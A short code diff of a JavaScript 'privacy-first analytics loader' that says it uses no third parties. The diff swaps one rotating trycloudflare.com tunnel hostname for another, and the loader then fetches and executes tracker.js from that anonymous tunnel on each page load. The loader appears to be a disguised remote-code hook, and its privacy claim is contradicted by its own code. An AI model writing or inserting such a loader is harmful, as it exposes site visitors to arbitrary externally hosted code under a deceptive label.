@@ -1,7 +1,7 @@
 /* BCE privacy-first analytics loader (no cookies, no third parties).
    The collector URL below is updated automatically when the tunnel restarts. */
 (function(){
-  var COLLECTOR="https://belkin-scientist-cameras-cables.trycloudflare.com";
+  var COLLECTOR="https://requirement-van-los-outsourcing.trycloudflare.com";
   var s=document.createElement('script');
   s.src=COLLECTOR+'/tracker.js'; s.defer=true;
   s.setAttribute('data-collector',COLLECTOR);
